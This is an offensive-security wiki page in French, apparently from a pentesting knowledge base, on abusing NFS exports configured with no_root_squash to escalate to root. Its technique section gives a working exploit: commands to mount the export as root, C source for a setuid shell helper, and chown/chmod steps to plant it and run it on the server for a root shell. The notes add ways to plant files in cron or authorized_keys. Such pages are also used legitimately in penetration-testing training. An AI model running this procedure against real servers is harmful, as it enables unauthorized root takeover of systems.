---
title: "Abus de no_root_squash : agir en tant que root sur un export NFS"
order: 2
description: "Par défaut, NFS mappe le root d'un client (UID 0) vers un utilisateur non privilégié (root squash). Un export configuré avec no_root_squash désactive cela, de sorte qu'un client qui le monte en tant que root crée et modifie des fichiers en tant que vrai root sur le serveur. L'abus standard écrit un binaire SUID possédé par root sur l'export, puis l'exécute sur le serveur pour obtenir root local."
keywords:
  - no_root_squash
  - root squash
  - suid
  - nfs
  - élévation de privilèges
---

# Abus de no_root_squash

NFS protège normalement le serveur en squashant un root distant : une requête arrivant avec l'UID 0 est remappée vers un utilisateur non privilégié (`nobody`), de sorte qu'un client ne peut pas agir en tant que root sur l'export. Lorsqu'un export est configuré avec `no_root_squash`, ce remappage est désactivé, et un client qui monte l'export en étant root localement crée et modifie des fichiers en tant que vrai UID 0 sur le serveur. L'élévation classique consiste à écrire un exécutable SUID possédé par root dans l'export ; comme le fichier est réellement possédé par root sur le serveur, l'exécuter là (par n'importe quel utilisateur local ou un point d'ancrage distinct) donne root.

## La technique

```bash
# 1. mount the no_root_squash export as local root on the attacker machine
mount -t nfs -o vers=3 <target>:/srv/share /mnt/nfs
# 2. write a SUID-root shell helper into the export, as root
cat > /mnt/nfs/.s.c <<'C'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/sh","sh",0); }
C
gcc -static /mnt/nfs/.s.c -o /mnt/nfs/.s
chown root:root /mnt/nfs/.s       # succeeds because root is not squashed
chmod 4755 /mnt/nfs/.s            # SUID root, owned by root on the server
# 3. on the server (or any foothold there), run it to become root
/path/on/server/.s                # -> root shell
```

L'écriture et le `chown root` ne réussissent que parce que `no_root_squash` permet que votre UID 0 soit honoré ; le bit SUID accorde ensuite root à quiconque exécute le binaire sur le serveur. Un helper lié statiquement évite les problèmes de chemin de bibliothèque sur la cible.

## Notes d'exploitation

- Cela nécessite à la fois `no_root_squash` sur l'export et la capacité d'exécuter le binaire planté sur le serveur, depuis un point d'ancrage peu privilégié existant sur le serveur, ou tout mécanisme qui exécute des fichiers depuis l'export.
- Testez `no_root_squash` en montant en tant que root et en tentant un `chown root:root` sur un fichier que vous créez ; le succès signifie que l'option est activée.
- Si vous ne pouvez pas exécuter directement sur le serveur, un binaire SUID aide tout de même un point d'ancrage distinct ; alternativement, écrivez dans un emplacement possédé par root (cron, authorized_keys) sur lequel le serveur lui-même agit.
- Là où seul `all_squash` ou `root_squash` est activé, cela échoue et vous vous repliez sur l'[usurpation d'UID et de GID](uid-and-gid-spoofing.md) pour les identités non-root.

## Références

- [exports(5): root_squash / no_root_squash](https://man7.org/linux/man-pages/man5/exports.5.html)
- [HackTricks: NFS no_root_squash](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
